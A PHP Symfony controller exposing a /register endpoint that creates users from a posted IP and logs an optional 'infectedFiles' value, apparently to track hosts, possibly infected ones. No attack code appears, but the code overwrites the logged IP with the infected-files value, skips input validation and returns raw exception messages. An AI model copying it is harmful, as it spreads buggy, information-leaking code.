<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Entity\Log;
use App\Entity\User;
use App\Repository\LogRepository;
use App\Repository\UserRepository;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Uid\Uuid;

class UserController extends BaseController
{
    public function __construct(
        private UserPasswordHasherInterface $passwordHasher,
        private UserRepository $userRepository,
        private LogRepository $logRepository
    ) {}

    /**
     * @Route("/register", methods={"POST"})
     */
    public function register(Request $request): Response
    {
        try {
            $user = new User();

            $data = json_decode($request->getContent(), true);

            $uuid = Uuid::v4();
            $ip = $data['ip'];

            $user->setIp($ip)
                ->setPassword($this->passwordHasher->hashPassword(
                    $user,
                    $uuid
                ))
                ->setRoles(['ROLE_USER']);

            $this->userRepository->save($user, true);

            $log = (new Log)
                ->setIp($ip);

            if(array_key_exists('infectedFiles', $data)) $log->setIp($data['infectedFiles']);

            $this->logRepository->save($log, true);


            return $this->json($user->getKey());
        } catch(\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }
}